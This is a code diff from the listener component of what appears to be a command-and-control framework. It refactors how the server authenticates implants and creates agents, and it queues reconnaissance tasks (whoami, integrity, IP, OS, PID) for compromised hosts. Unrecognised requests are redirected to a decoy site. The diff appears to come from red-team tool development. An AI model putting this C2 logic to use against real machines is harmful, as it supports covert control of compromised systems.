@@ -31,16 +31,16 @@ class ListenerRoutes:
             #display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
             return web.HTTPFound("https://www.google.com")
 
-        with get_session() as session:
-            if isinstance(batch_response, dict):
+        if isinstance(batch_response, dict):
+            with get_session() as session:
                 display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
                 implant = session.query(ImplantModel).filter_by(key=batch_response['id']).first()
                 if not implant:
                     display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
                     return web.HTTPFound("https://www.google.com")
                 return web.Response(text=self.create_agent(implant, session))
-            batch_request = self.task_manager.parse_batch_response(batch_response)
-            return web.json_response(batch_request)
+        batch_request = await self.task_manager.parse_batch_response(batch_response)
+        return web.json_response(batch_request)
 
     def create_agent(self, implant, session):
         agent = AgentModel(implant=implant)
@@ -58,6 +58,5 @@ class ListenerRoutes:
         pid_task = TaskModel(agent=agent, method='pid', type=-1, parameters='', misc='')
         session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
         session.commit()
-        self.sio_client.emit('proxy', json.dumps(['information', f'Created agent {agent.id} sending it to implant {implant.id}']))
-        session.close()
+        display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
         return str(agent.check_in_task_id)
